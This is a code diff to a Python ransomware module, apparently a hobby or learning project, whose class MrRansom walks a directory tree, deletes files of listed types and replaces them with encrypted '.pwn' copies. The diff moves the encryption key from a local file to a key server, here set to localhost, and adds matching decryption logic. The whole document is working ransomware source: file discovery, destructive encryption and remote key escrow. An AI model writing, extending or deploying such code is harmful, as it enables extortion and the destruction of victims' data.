@@ -1,94 +1,71 @@
 import json
 import os
-import sys
 
 import locksmith
 from aldersonalgorithm import AldersonAlgorithm
-from file_util import get_file, put_file, get_file_bytes_e64, put_file_d64
+from fileutil import get_file, put_file, get_file_bytes_e64, put_file_d64
 
-ENCRYPT = 'encrypt'
+FILE_TYPES_JSON_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")
 
-DECRYPT = 'decrypt'
-
-FILE_TYPES_JSON = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")
+FILE_TYPES = json.loads(get_file(FILE_TYPES_JSON_PATH))["fileTypes"]
 
 ENCRYPTED_EXTENSION = ".pwn"
 
+KEY_SERVER = 'http://localhost:5000'
 
-def get_target_files(files, mode):
+BLOCK_SIZE = 5
+
+
+def get_files_to_process(files, should_process):
     files_to_process = []
     for file_path in files:
-        if should_process(file_path, mode):
+        if should_process(file_path):
             files_to_process.append(file_path)
 
     return files_to_process
 
 
-def should_process(file_path, mode):
-    return mode == ENCRYPT and can_encrypt_file(file_path) \
-           or mode == DECRYPT and can_decrypt_file(file_path)
-
-
 def can_encrypt_file(file_path):
-    for file_type in encryptable_file_types():
+    for file_type in FILE_TYPES:
         if file_path.endswith(file_type) and not os.path.basename(file_path).startswith("."):
             return True
 
 
 def can_decrypt_file(file_name):
-    if file_name.endswith(ENCRYPTED_EXTENSION):
-        return True
+    return file_name.endswith(ENCRYPTED_EXTENSION)
 
 
-def encryptable_file_types():
-    types_json = json.loads(get_file(FILE_TYPES_JSON))
-
-    return [file_type for file_type in types_json["fileTypes"]]
+def get_all_files(root_dir):
+    return [os.path.join(path, file_name)
+            for path, directories, file_names in os.walk(root_dir)
+            for file_name in file_names]
 
 
 class MrRansom:
 
     def __init__(self, root_dir):
         self.root_dir = root_dir
-        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
-                          os.walk(root_dir) for file_name in file_names]
+        self.all_files = get_all_files(root_dir)
 
     def encrypt(self):
-        key = self.make_key()
+        key = locksmith.create_key()
+        locksmith.export_key(KEY_SERVER, key, self.root_dir)
 
-        for file_path in get_target_files(self.all_files, ENCRYPT):
+        for file_path in get_files_to_process(self.all_files, can_encrypt_file):
             content = get_file_bytes_e64(file_path)
             os.remove(file_path)
 
-            encrypted = AldersonAlgorithm(key).encrypt(content)
+            encrypted = AldersonAlgorithm(key, BLOCK_SIZE).encrypt(content)
 
             put_file(file_path + ENCRYPTED_EXTENSION, encrypted)
 
     def decrypt(self):
-        key = self.get_key()
+        key = locksmith.get_key(KEY_SERVER, self.root_dir)
 
-        for file_path in get_target_files(self.all_files, DECRYPT):
+        for file_path in get_files_to_process(self.all_files, can_decrypt_file):
             content = get_file(file_path)
-            os.remove(file_path)
 
-            decrypted = AldersonAlgorithm(key).decrypt(content)
+            decrypted = AldersonAlgorithm(key, BLOCK_SIZE).decrypt(content)
 
             put_file_d64(file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)], decrypted)
-
-    def make_key(self):
-        key = locksmith.create_key()
-        try:
-            locksmith.export_key_file(self.root_dir, key)
-        except Exception as e:
-            print >> sys.stderr, e.message
-            exit(-1)
-        return key
-
-    def get_key(self):
-        key = None
-        try:
-            key = locksmith.get_key_file(self.root_dir)
-        except Exception as e:
-            print >> sys.stderr, e.message
-            exit(-1)
-        return key
+            os.remove(file_path)
